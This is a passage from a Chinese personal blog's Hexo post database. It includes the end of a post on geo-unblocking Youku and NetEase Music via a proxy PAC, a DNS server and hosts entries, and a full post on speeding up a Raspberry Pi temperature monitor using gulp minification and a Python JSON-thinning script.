href=\"https://github.com/uku/Unblock-Youku/issues/618\" target=\"_blank\" rel=\"external\">https://github.com/uku/Unblock-Youku/issues/618</a></p>\n<h1 id=\"替换hosts大法\"><a href=\"#替换hosts大法\" class=\"headerlink\" title=\"替换hosts大法\"></a>替换hosts大法</h1><h2 id=\"网易云音乐\"><a href=\"#网易云音乐\" class=\"headerlink\" title=\"网易云音乐\"></a>网易云音乐</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">104.236.189.178 http://music.163.com </div><div class=\"line\">198.47.104.134 http://m1.music.126.net </div><div class=\"line\">198.47.104.134 http://m2.music.126.net </div><div class=\"line\">198.47.104.134 http://m3.music.126.net </div><div class=\"line\">198.47.104.134 http://m4.music.126.net</div><div class=\"line\">198.47.104.134 http://m5.music.126.net </div><div class=\"line\">198.47.104.134 http://m6.music.126.net </div><div class=\"line\">198.47.104.134 http://m7.music.126.net </div><div class=\"line\">198.47.104.134 http://m8.music.126.net </div><div class=\"line\">198.47.104.134 http://m9.music.126.net </div><div class=\"line\">198.47.104.134 http://m10.music.126.net</div></pre></td></tr></table></figure>\n","excerpt":"","more":"<h1 id=\"DNS-PAC大法\"><a href=\"#DNS-PAC大法\" class=\"headerlink\" title=\"DNS/PAC大法\"></a>DNS/PAC大法</h1><h2 id=\"优酷土豆爱奇艺\"><a href=\"#优酷土豆爱奇艺\" class=\"headerlink\" title=\"优酷土豆爱奇艺\"></a>优酷土豆爱奇艺</h2><p>在 iOS 的 Wi-Fi 设置当中，点进某个 Wi-Fi 的属性页面，拖到最下面设置「HTTP 代理」-「自动」为：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://pac.uku.im/pac.pac</div></pre></td></tr></table></figure></p>\n<p>DNS:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">158.69.209.100</div></pre></td></tr></table></figure></p>\n<p>更新：<a href=\"https://github.com/uku/Unblock-Youku/issues/618\">https://github.com/uku/Unblock-Youku/issues/618</a></p>\n<h1 id=\"替换hosts大法\"><a href=\"#替换hosts大法\" class=\"headerlink\" title=\"替换hosts大法\"></a>替换hosts大法</h1><h2 id=\"网易云音乐\"><a href=\"#网易云音乐\" class=\"headerlink\" title=\"网易云音乐\"></a>网易云音乐</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">104.236.189.178 http://music.163.com </div><div class=\"line\">198.47.104.134 http://m1.music.126.net </div><div class=\"line\">198.47.104.134 http://m2.music.126.net </div><div class=\"line\">198.47.104.134 http://m3.music.126.net </div><div class=\"line\">198.47.104.134 http://m4.music.126.net</div><div class=\"line\">198.47.104.134 http://m5.music.126.net </div><div class=\"line\">198.47.104.134 http://m6.music.126.net </div><div class=\"line\">198.47.104.134 http://m7.music.126.net </div><div class=\"line\">198.47.104.134 http://m8.music.126.net </div><div class=\"line\">198.47.104.134 http://m9.music.126.net </div><div class=\"line\">198.47.104.134 http://m10.music.126.net</div></pre></td></tr></table></figure>"},{"title":"树莓派实时温度湿度监测 优化后续","date":"2016-11-17T23:46:21.000Z","_content":"\n树莓派这个项目已经过去了两月了，一直没有维护，直到我到了英国后发现，在英国连接北京的树莓派网速堪忧，只有100kb/s，每次想查看家里的温度情况，都要等待很长时间才能加载出来，有时候会丢包，这让我很不爽，于是我决定小小的优化一下。\n<!-- more --> \n\n# 优化css js\n之前写的css与js一直没有压缩，这次决定用gulp压缩一下\n\n安装 `gulp`\n```\nnpm install -g gulp \n```\n安装 `gulp-uglify` 模块\n```\nnpm install gulp-uglify\n```\n安装 `gulp-minify-css` 模块\n```\nnpm install gulp-minify-css\n```\n压缩源：\n```\nasset/dist/js\nasset/dist/css\n```\n\n目标：\n```\nasset/js\nasset/css\n```\n\n好的 我们可以开始写`gulpfile.js`文件了\n```javascript\n// 获取 gulp\nvar gulp = require('gulp')\n\n// 获取 uglify 模块（用于压缩 JS）\nvar uglify = require('gulp-uglify')\n// 获取 minify-css 模块（用于压缩 CSS）\nvar minifyCSS = require('gulp-minify-css')\n\n// 压缩 js 文件\n// 在命令行使用 gulp script 启动此任务\ngulp.task('script', function() {\n    // 1. 找到文件\n    gulp.src('asset/dist/js/*.js')\n    // 2. 压缩文件\n        .pipe(uglify())\n    // 3. 另存压缩后的文件\n        .pipe(gulp.dest('asset/js'))\n})\n// 压缩 css 文件\n// 在命令行使用 gulp css 启动此任务\ngulp.task('css', function () {\n    // 1. 找到文件\n    gulp.src('asset/dist/css/*.css')\n    // 2. 压缩文件\n        .pipe(minifyCSS())\n    // 3. 另存为压缩文件\n        .pipe(gulp.dest('asset/css'))\n})\n\n// 在命令行使用 gulp auto 启动此任务\ngulp.task('auto', function () {\n    // 监听文件修改，当文件被修改则执行 script 任务\n    gulp.watch('js/*.js', ['script'])\n    gulp.watch('css/*.css', ['css'])\n})\n\n\n// 使用 gulp.task('default') 定义默认任务\n// 在命令行使用 gulp 启动 script 任务和 auto 任务\ngulp.task('default', ['script', 'css' , 'auto'])\n```\n\n执行gulp即可进行自动压缩及监听任务\n\n# 结构优化\n这是原有的结构\n\n前端：Semantic UI + eCharts + JQuery Datapicker\n\n数据： json(时间)\n\n后端：Python + Apache\n\n后端的python程序负责测温度和测湿度，并生成json数据，为了保证事实性，python程序一直在读写相同的json文件，每一分钟读写一次，造成了json文件的比较大，大概有68KB，在前端是通过ajax加载的json文件，如果网速很慢的话，必然会造成很长时间的延迟。\n\n为了解决这个问题，首先第一步就是减小json文件大小。设计了一个解决方案是，以前的前端已经可以加载每小时数据和每分钟数据，不过小时和分钟的数据是通过在js中忽略加载实现的。\n\n而现在采用新的方案，在data数据目录下，分别建立两个目录。\n\n```\ndata/min\ndata/hour\n```\n\n数据： json(min) / json(hour) \n\nmin的数据专门用于保存min,hour专门用于保存hour，为了解决旧数据迁移问题，首先先将内容移动到min目录下，在根目录下写了一个python小程序，执行挑选出hour数据并且迁移。\n\n\n```python\n#!/usr/bin/python\nimport sys\nimport time\nimport json\nimport os\nimport string\n\ndef jsonRead(path,topath,name):\n    pathfile = path + '/' + name\n    topathfile = topath + '/' + name\n    if os.path.exists(pathfile):\n        file =open(pathfile,\"r\")\n        data = json.loads(file.read().decode('utf-8'))\n        i = 1\n        jsonWrite(data[0],topathfile)\n        for v in data:\n            i = i + 1\n            if(i%60==0):\n                jsonWrite(v,topathfile)\n        file.close()\n    else:\n        print 'unable to open ' + pathfile + 'file'\ndef jsonWrite(data,pathfile):\n    if os.path.exists(pathfile):\n      file =open(pathfile,\"rb+\")\n      file.seek(-1,os.SEEK_END)\n      file.truncate()\n      file.write(\",\")\n      json.dump(data,file)\n      file.write(\"]\")\n      file.close()\n      print 'succes: '+ pathfile\n    else:\n      file =open(pathfile,\"w\")\n      file.write(\"[\")\n      json.dump(data,file)\n      file.write(\"]\")\n      file.close()\n\ndir = 'web/data/min'\ndist = 'web/data/hour'\nfiles = os.listdir(dir)\n\nfor root, dirs, files in os.walk(dir):\n    for name in files:\n        jsonRead(dir,dist,name)\n\n```\n与此同时也需要修改 前端js 与 后端python\n具体代码在 [项目地址](https://github.com/yfgeek/rpi-TempRuntime/)，不贴了。\n\n最后，经过优化，速度大概提升了5倍，前端获取的json文件为1KB。\n\n后续还会增加季度数据统计，等待数据量大一点的时候方便做数据统计工作。\n","source":"_posts/树莓派实时温度湿度监测 优化后续.md","raw":"---\ntitle: 树莓派实时温度湿度监测 优化后续\ndate: 2016-11-17 23:46:21\ntags: 'Raspberry'\ncategories: 'Raspberry'\npermalink: opt-rpi-project\n---\n\n树莓派这个项目已经过去了两月了，一直没有维护，直到我到了英国后发现，在英国连接北京的树莓派网速堪忧，只有100kb/s，每次想查看家里的温度情况，都要等待很长时间才能加载出来，有时候会丢包，这让我很不爽，于是我决定小小的优化一下。\n<!-- more --> \n\n# 优化css js\n之前写的css与js一直没有压缩，这次决定用gulp压缩一下\n\n安装 `gulp`\n```\nnpm install -g gulp \n```\n安装 `gulp-uglify` 模块\n```\nnpm install gulp-uglify\n```\n安装 `gulp-minify-css` 模块\n```\nnpm install gulp-minify-css\n```\n压缩源：\n```\nasset/dist/js\nasset/dist/css\n```\n\n目标：\n```\nasset/js\nasset/css\n```\n\n好的 我们可以开始写`gulpfile.js`文件了\n```javascript\n// 获取 gulp\nvar gulp = require('gulp')\n\n// 获取 uglify 模块（用于压缩 JS）\nvar uglify = require('gulp-uglify')\n// 获取 minify-css 模块（用于压缩 CSS）\nvar minifyCSS = require('gulp-minify-css')\n\n// 压缩 js 文件\n// 在命令行使用 gulp script 启动此任务\ngulp.task('script', function() {\n    // 1. 找到文件\n    gulp.src('asset/dist/js/*.js')\n    // 2. 压缩文件\n        .pipe(uglify())\n    // 3. 另存压缩后的文件\n        .pipe(gulp.dest('asset/js'))\n})\n// 压缩 css 文件\n// 在命令行使用 gulp css 启动此任务\ngulp.task('css', function () {\n    // 1. 找到文件\n    gulp.src('asset/dist/css/*.css')\n    // 2. 压缩文件\n        .pipe(minifyCSS())\n    // 3. 另存为压缩文件\n        .pipe(gulp.dest('asset/css'))\n})\n\n// 在命令行使用 gulp auto 启动此任务\ngulp.task('auto', function () {\n    // 监听文件修改，当文件被修改则执行 script 任务\n    gulp.watch('js/*.js', ['script'])\n    gulp.watch('css/*.css', ['css'])\n})\n\n\n// 使用 gulp.task('default') 定义默认任务\n// 在命令行使用 gulp 启动 script 任务和 auto 任务\ngulp.task('default', ['script', 'css' , 'auto'])\n```\n\n执行gulp即可进行自动压缩及监听任务\n\n# 结构优化\n这是原有的结构\n\n前端：Semantic UI + eCharts + JQuery Datapicker\n\n数据： json(时间)\n\n后端：Python + Apache\n\n后端的python程序负责测温度和测湿度，并生成json数据，为了保证事实性，python程序一直在读写相同的json文件，每一分钟读写一次，造成了json文件的比较大，大概有68KB，在前端是通过ajax加载的json文件，如果网速很慢的话，必然会造成很长时间的延迟。\n\n为了解决这个问题，首先第一步就是减小json文件大小。设计了一个解决方案是，以前的前端已经可以加载每小时数据和每分钟数据，不过小时和分钟的数据是通过在js中忽略加载实现的。\n\n而现在采用新的方案，在data数据目录下，分别建立两个目录。\n\n```\ndata/min\ndata/hour\n```\n\n数据： json(min) / json(hour) \n\nmin的数据专门用于保存min,hour专门用于保存hour，为了解决旧数据迁移问题，首先先将内容移动到min目录下，在根目录下写了一个python小程序，执行挑选出hour数据并且迁移。\n\n\n```python\n#!/usr/bin/python\nimport sys\nimport time\nimport json\nimport os\nimport string\n\ndef jsonRead(path,topath,name):\n    pathfile = path + '/' + name\n    topathfile = topath + '/' + name\n    if os.path.exists(pathfile):\n        file =open(pathfile,\"r\")\n        data = json.loads(file.read().decode('utf-8'))\n        i = 1\n        jsonWrite(data[0],topathfile)\n        for v in data:\n            i = i + 1\n            if(i%60==0):\n                jsonWrite(v,topathfile)\n        file.close()\n    else:\n        print 'unable to open ' + pathfile + 'file'\ndef jsonWrite(data,pathfile):\n    if os.path.exists(pathfile):\n      file =open(pathfile,\"rb+\")\n      file.seek(-1,os.SEEK_END)\n      file.truncate()\n      file.write(\",\")\n      json.dump(data,file)\n      file.write(\"]\")\n      file.close()\n      print 'succes: '+ pathfile\n    else:\n      file =open(pathfile,\"w\")\n      file.write(\"[\")\n      json.dump(data,file)\n      file.write(\"]\")\n      file.close()\n\ndir = 'web/data/min'\ndist = 'web/data/hour'\nfiles = os.listdir(dir)\n\nfor root, dirs, files in os.walk(dir):\n    for name in files:\n        jsonRead(dir,dist,name)\n\n```\n与此同时也需要修改 前端js 与 后端python\n具体代码在 [项目地址](https://github.com/yfgeek/rpi-TempRuntime/)，不贴了。\n\n最后，经过优化，速度大概提升了5倍，前端获取的json文件为1KB。\n\n后续还会增加季度数据统计，等待数据量大一点的时候方便做数据统计工作。\n","slug":"opt-rpi-project","published":1,"updated":"2016-11-19T12:08:40.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"civym301o001xcdon22ahbwc8","content":"<p>树莓派这个项目已经过去了两月了，一直没有维护，直到我到了英国后发现，在英国连接北京的树莓派网速堪忧，只有100kb/s，每次想查看家里的温度情况，都要等待很长时间才能加载出来，有时候会丢包，这让我很不爽，于是我决定小小的优化一下。<br><a id=\"more\"></a> </p>\n<h1 id=\"优化css-js\"><a href=\"#优化css-js\" class=\"headerlink\" title=\"优化css js\"></a>优化css js</h1><p>之前写的css与js一直没有压缩，这次决定用gulp压缩一下</p>\n<p>安装 <code>gulp</code><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm install -g gulp</div></pre></td></tr></table></figure></p>\n<p>安装 <code>gulp-uglify</code> 模块<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm install gulp-uglify</div></pre></td></tr></table></figure></p>\n<p>安装 <code>gulp-minify-css</code> 模块<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm install gulp-minify-css</div></pre></td></tr></table></figure></p>\n<p>压缩源：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">asset/dist/js</div><div class=\"line\">asset/dist/css</div></pre></td></tr></table></figure></p>\n<p>目标：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">asset/js</div><div class=\"line\">asset/css</div></pre></td></tr></table></figure></p>\n<p>好的 我们可以开始写<code>gulpfile.js</code>文件了<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">// 获取 gulp</span></div><div class=\"line\"><span class=\"keyword\">var</span> gulp = <span class=\"built_in\">require</span>(<span class=\"string\">'gulp'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// 获取 uglify 模块（用于压缩 JS）</span></div><div class=\"line\"><span class=\"keyword\">var</span> uglify = <span class=\"built_in\">require</span>(<span class=\"string\">'gulp-uglify'</span>)</div><div class=\"line\"><span class=\"comment\">// 获取 minify-css 模块（用于压缩 CSS）</span></div><div class=\"line\"><span class=\"keyword\">var</span> minifyCSS = <span class=\"built_in\">require</span>(<span class=\"string\">'gulp-minify-css'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// 压缩 js 文件</span></div><div class=\"line\"><span class=\"comment\">// 在命令行使用 gulp script 启动此任务</span></div><div class=\"line\">gulp.task(<span class=\"string\">'script'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">    <span class=\"comment\">// 1. 找到文件</span></div><div class=\"line\">    gulp.src(<span class=\"string\">'asset/dist/js/*.js'</span>)</div><div class=\"line\">    <span class=\"comment\">// 2. 压缩文件</span></div><div class=\"line\">        .pipe(uglify())</div><div class=\"line\">    <span class=\"comment\">// 3. 另存压缩后的文件</span></div><div class=\"line\">        .pipe(gulp.dest(<span class=\"string\">'asset/js'</span>))</div><div class=\"line\">&#125;)</div><div class=\"line\"><span class=\"comment\">// 压缩 css 文件</span></div><div class=\"line\"><span class=\"comment\">// 在命令行使用 gulp css 启动此任务</span></div><div class=\"line\">gulp.task(<span class=\"string\">'css'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">    <span class=\"comment\">// 1. 找到文件</span></div><div class=\"line\">    gulp.src(<span class=\"string\">'asset/dist/css/*.css'</span>)</div><div class=\"line\">    <span class=\"comment\">// 2. 压缩文件</span></div><div class=\"line\">        .pipe(minifyCSS())</div><div class=\"line\">    <span class=\"comment\">// 3. 另存为压缩文件</span></div><div class=\"line\">        .pipe(gulp.dest(<span class=\"string\">'asset/css'</span>))</div><div class=\"line\">&#125;)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// 在命令行使用 gulp auto 启动此任务</span></div><div class=\"line\">gulp.task(<span class=\"string\">'auto'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">    <span class=\"comment\">// 监听文件修改，当文件被修改则执行 script 任务</span></div><div class=\"line\">    gulp.watch(<span class=\"string\">'js/*.js'</span>, [<span class=\"string\">'script'</span>])</div><div class=\"line\">    gulp.watch(<span class=\"string\">'css/*.css'</span>, [<span class=\"string\">'css'</span>])</div><div class=\"line\">&#125;)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// 使用 gulp.task('default') 定义默认任务</span></div><div class=\"line\"><span class=\"comment\">// 在命令行使用 gulp 启动 script 任务和 auto 任务</span></div><div class=\"line\">gulp.task(<span class=\"string\">'default'</span>, [<span class=\"string\">'script'</span>, <span class=\"string\">'css'</span> , <span class=\"string\">'auto'</span>])</div></pre></td></tr></table></figure></p>\n<p>执行gulp即可进行自动压缩及监听任务</p>\n<h1 id=\"结构优化\"><a href=\"#结构优化\" class=\"headerlink\" title=\"结构优化\"></a>结构优化</h1><p>这是原有的结构</p>\n<p>前端：Semantic UI + eCharts + JQuery Datapicker</p>\n<p>数据： json(时间)</p>\n<p>后端：Python + Apache</p>\n<p>后端的python程序负责测温度和测湿度，并生成json数据，为了保证事实性，python程序一直在读写相同的json文件，每一分钟读写一次，造成了json文件的比较大，大概有68KB，在前端是通过ajax加载的json文件，如果网速很慢的话，必然会造成很长时间的延迟。</p>\n<p>为了解决这个问题，首先第一步就是减小json文件大小。设计了一个解决方案是，以前的前端已经可以加载每小时数据和每分钟数据，不过小时和分钟的数据是通过在js中忽略加载实现的。</p>\n<p>而现在采用新的方案，在data数据目录下，分别建立两个目录。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">data/min</div><div class=\"line\">data/hour</div></pre></td></tr></table></figure>\n<p>数据： json(min) / json(hour) </p>\n<p>min的数据专门用于保存min,hour专门用于保存hour，为了解决旧数据迁移问题，首先先将内容移动到min目录下，在根目录下写了一个python小程序，执行挑选出hour数据并且迁移。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></div><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\"><span class=\"keyword\">import</span> time</div><div class=\"line\"><span class=\"keyword\">import</span> json</div><div class=\"line\"><span class=\"keyword\">import</span> os</div><div class=\"line\"><span class=\"keyword\">import</span> string</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">jsonRead</span><span class=\"params\">(path,topath,name)</span>:</span></div><div class=\"line\">    pathfile = path + <span class=\"string\">'/'</span> + name</div><div class=\"line\">    topathfile = topath + <span class=\"string\">'/'</span> + name</div><div class=\"line\">    <span class=\"keyword\">if</span> os.path.exists(pathfile):</div><div class=\"line\">        file =open(pathfile,<span class=\"string\">\"r\"</span>)</div><div class=\"line\">        data = json.loads(file.read().decode(<span class=\"string\">'utf-8'</span>))</div><div class=\"line\">        i = <span class=\"number\">1</span></div><div class=\"line\">        jsonWrite(data[<span class=\"number\">0</span>],topathfile)</div><div class=\"line\">        <span class=\"keyword\">for</span> v <span class=\"keyword\">in</span> data:</div><div class=\"line\">            i = i + <span class=\"number\">1</span></div><div class=\"line\">            <span class=\"keyword\">if</span>(i%<span class=\"number\">60</span>==<span class=\"number\">0</span>):</div><div class=\"line\">                jsonWrite(v,topathfile)</div><div class=\"line\">        file.close()</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">'unable to open '</span> + pathfile + <span class=\"string\">'file'</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">jsonWrite</span><span class=\"params\">(data,pathfile)</span>:</span></div><div class=\"line\">    <span class=\"keyword\">if</span> os.path.exists(pathfile):</div><div class=\"line\">      file =open(pathfile,<span class=\"string\">\"rb+\"</span>)</div><div class=\"line\">      file.seek(<span class=\"number\">-1</span>,os.SEEK_END)</div><div class=\"line\">      file.truncate()</div><div class=\"line\">      file.write(<span class=\"string\">\",\"</span>)</div><div class=\"line\">      json.dump(data,file)</div><div class=\"line\">      file.write(<span class=\"string\">\"]\"</span>)</div><div class=\"line\">      file.close()</div><div class=\"line\">      <span class=\"keyword\">print</span> <span class=\"string\">'succes: '</span>+ pathfile</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">      file =open(pathfile,<span class=\"string\">\"w\"</span>)</div><div class=\"line\">      file.write(<span class=\"string\">\"[\"</span>)</div><div class=\"line\">      json.dump(data,file)</div><div class=\"line\">      file.write(<span class=\"string\">\"]\"</span>)</div><div class=\"line\">      file.close()</div><div class=\"line\"></div><div class=\"line\">dir = <span class=\"string\">'web/data/min'</span></div><div class=\"line\">dist = <span class=\"string\">'web/data/hour'</span></div><div class=\"line\">files = os.listdir(dir)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">for</span> root, dirs, files <span class=\"keyword\">in</span> os.walk(dir):</div><div class=\"line\">    <span class=\"keyword\">for</span> name <span class=\"keyword\">in</span> files:</div><div class=\"line\">        jsonRead(dir,dist,name)</div></pre></td></tr></table></figure>\n<p>与此同时也需要修改 前端js 与 后端python<br>具体代码在 <a href=\"https://github.com/yfgeek/rpi-TempRuntime/\" target=\"_blank\" rel=\"external\">项目地址</a>，不贴了。</p>\n<p>最后，经过优化，速度大概提升了5倍，前端获取的json文件为1KB。</p>\n<p>后续还会增加季度数据统计，等待数据量大一点的时候方便做数据统计工作。</p>\n","excerpt":"<p>树莓派这个项目已经过去了两月了，一直没有维护，直到我到了英国后发现，在英国连接北京的树莓派网速堪忧，只有100kb/s，每次想查看家里的温度情况，都要等待很长时间才能加载出来，有时候会丢包，这让我很不爽，于是我决定小小的优化一下。<br>","more":"</p>\n<h1 id=\"优化css-js\"><a href=\"#优化css-js\" class=\"headerlink\" title=\"优化css js\"></a>优化css js</h1><p>之前写的css与js一直没有压缩，这次决定用gulp压缩一下</p>\n<p>安装 <code>gulp</code><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm install -g gulp</div></pre></td></tr></table></figure></p>\n<p>安装 <code>gulp-uglify</code> 模块<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm install gulp-uglify</div></pre></td></tr></table></figure></p>\n<p>安装 <code>gulp-minify-css</code> 模块<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm install gulp-minify-css</div></pre></td></tr></table></figure></p>\n<p>压缩源：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">asset/dist/js</div><div class=\"line\">asset/dist/css</div></pre></td></tr></table></figure></p>\n<p>目标：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">asset/js</div><div class=\"line\">asset/css</div></pre></td></tr></table></figure></p>\n<p>好的 我们可以开始写<code>gulpfile.js</code>文件了<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">// 获取 gulp</span></div><div class=\"line\"><span class=\"keyword\">var</span> gulp = <span class=\"built_in\">require</span>(<span class=\"string\">'gulp'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// 获取 uglify 模块（用于压缩 JS）</span></div><div class=\"line\"><span class=\"keyword\">var</span> uglify = <span class=\"built_in\">require</span>(<span class=\"string\">'gulp-uglify'</span>)</div><div class=\"line\"><span class=\"comment\">// 获取 minify-css 模块（用于压缩 CSS）</span></div><div class=\"line\"><span class=\"keyword\">var</span> minifyCSS = <span class=\"built_in\">require</span>(<span class=\"string\">'gulp-minify-css'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// 压缩 js 文件</span></div><div class=\"line\"><span class=\"comment\">// 在命令行使用 gulp script 启动此任务</span></div><div class=\"line\">gulp.task(<span class=\"string\">'script'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">    <span class=\"comment\">// 1. 找到文件</span></div><div class=\"line\">    gulp.src(<span class=\"string\">'asset/dist/js/*.js'</span>)</div><div class=\"line\">    <span class=\"comment\">// 2. 压缩文件</span></div><div class=\"line\">        .pipe(uglify())</div><div class=\"line\">    <span class=\"comment\">// 3. 另存压缩后的文件</span></div><div class=\"line\">        .pipe(gulp.dest(<span class=\"string\">'asset/js'</span>))</div><div class=\"line\">&#125;)</div><div class=\"line\"><span class=\"comment\">// 压缩 css 文件</span></div><div class=\"line\"><span class=\"comment\">// 在命令行使用 gulp css 启动此任务</span></div><div class=\"line\">gulp.task(<span class=\"string\">'css'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">    <span class=\"comment\">// 1. 找到文件</span></div><div class=\"line\">    gulp.src(<span class=\"string\">'asset/dist/css/*.css'</span>)</div><div class=\"line\">    <span class=\"comment\">// 2. 压缩文件</span></div><div class=\"line\">        .pipe(minifyCSS())</div><div class=\"line\">    <span class=\"comment\">// 3. 另存为压缩文件</span></div><div class=\"line\">        .pipe(gulp.dest(<span class=\"string\">'asset/css'</span>))</div><div 